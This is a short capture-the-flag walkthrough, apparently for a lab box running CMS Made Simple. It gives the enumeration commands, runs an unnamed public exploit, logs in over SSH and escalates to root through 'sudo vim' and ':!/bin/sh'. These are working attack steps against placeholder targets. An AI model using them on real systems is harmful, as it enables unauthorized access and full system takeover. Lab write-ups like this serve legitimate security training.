Walkthrough
1. Initial Enumeration

Started by scanning the target using Nmap:nmap -sV -sC -A <TARGET-IP>
The scan identified several open services, including an FTP service.

2. FTP Enumeration
Connected to the FTP service:ftp <TARGET-IP>
While exploring the FTP server, passive mode caused connection issues.
Disabled passive mode using:passive

Useful commands:
ls
get <filename>
cat <filename>
The downloaded files contained useful information for the next stage.

3. Directory Enumeration
Performed directory brute forcing using Gobuster:gobuster dir \ -u http://<TARGET-IP> \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
This revealed a hidden web directory.

4. Web Enumeration
Retrieved the web page from the command line:curl http://<TARGET-IP>/simple/
The application was identified as CMS Made Simple.

5. Vulnerability Research
Searched for publicly available exploits:searchsploit "CMS Made Simple"
A suitable exploit was available.
Executed the exploit:python2 <exploit>.py -u http://<TARGET-IP>/simple
The exploit successfully disclosed information that allowed further access to the system.

6. SSH Access
Connected to the SSH service using the recovered credentials:ssh <username>@<TARGET-IP> -p <port>
Verified access:whoami

7. Enumeration
Collected information about the current user.
id
sudo -l
ls
Read the user flag:cat user.txt(Flag omitted.)

8. Privilege Escalation
Discovered that Vim could be executed with elevated privileges.
Started Vim.
sudo vim
Spawned a root shell.
:!/bin/sh
Confirmed root access.
whoami
Output:
root
Navigated to the root directory.
cd /root
ls
cat root.txt(Flag omitted.)

